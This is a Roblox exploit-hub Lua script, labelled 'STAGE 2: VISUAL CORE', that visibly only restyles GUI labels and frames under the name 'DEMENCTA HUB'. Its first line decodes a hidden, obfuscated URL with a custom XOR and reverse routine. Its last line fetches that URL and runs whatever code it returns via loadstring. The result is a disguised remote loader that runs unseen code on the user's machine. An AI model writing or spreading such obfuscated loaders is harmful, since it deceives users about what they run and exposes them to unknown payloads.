
--[[ STAGE 2: VISUAL CORE ]]
local zDboCw4ynu8Hh="\206\189\201\138\216\217\139\145\150\154\156\235\244\241\246\234\234\243\018\009\184\192\184\198\191\004\030\030\014\062\042\031\026\030\039\055\038\077\066\247\072\062\076\066\078\067\071\123\096\093\082\103\102\098\108\130\120\099\120\146\052\120\128\139\130\067\137\140\154\135\150\161\158\152\171\097\175\163\171\187\178\189\184\199\189\191\195\133\202\203\218\146\207\216\228\216\225\227\242\230\246\235\236\002\242\002\249\007\012\200\002\027\013\211\214\206\024\030\029\032\047"local l8WurbJA9jRZdvWXJjtM=63 local _RxhscKAs0lZE55vZ=88 local o5YMIgWpG0xPk=0 local vpwkcdwYQMN2r8NKXpKI=3 local HTzVWwYTibjcu2_SL9jqXt=21 local yoqIN6UyqiUegTByP=true local iR56btqgJ7feDqSF7mdmG6=bit32 and bit32.bxor if not iR56btqgJ7feDqSF7mdmG6 then iR56btqgJ7feDqSF7mdmG6=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local S7317XK6ZScaCJJ9gOVC={}for JymLOtLPnJzQySForhT=1,#zDboCw4ynu8Hh do local To8bwPMGyW9Z8RW1Lr5=string.byte(zDboCw4ynu8Hh,JymLOtLPnJzQySForhT)local aqu3L9mJeZKGk=(_RxhscKAs0lZE55vZ+(JymLOtLPnJzQySForhT*vpwkcdwYQMN2r8NKXpKI)+HTzVWwYTibjcu2_SL9jqXt)%256 if o5YMIgWpG0xPk==0 then To8bwPMGyW9Z8RW1Lr5=(To8bwPMGyW9Z8RW1Lr5-aqu3L9mJeZKGk)%256 S7317XK6ZScaCJJ9gOVC[JymLOtLPnJzQySForhT]=string.char(iR56btqgJ7feDqSF7mdmG6(To8bwPMGyW9Z8RW1Lr5,l8WurbJA9jRZdvWXJjtM))else To8bwPMGyW9Z8RW1Lr5=iR56btqgJ7feDqSF7mdmG6(To8bwPMGyW9Z8RW1Lr5,l8WurbJA9jRZdvWXJjtM)S7317XK6ZScaCJJ9gOVC[JymLOtLPnJzQySForhT]=string.char((To8bwPMGyW9Z8RW1Lr5-aqu3L9mJeZKGk)%256)end end local QEptrz3qruuzpnitkA=table.concat(S7317XK6ZScaCJJ9gOVC)if yoqIN6UyqiUegTByP then QEptrz3qruuzpnitkA=string.reverse(QEptrz3qruuzpnitkA)end local GlWmzHQJs2Dg91LK4=QEptrz3qruuzpnitkA
local HubName = "DEMENCTA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(GlWmzHQJs2Dg91LK4))()
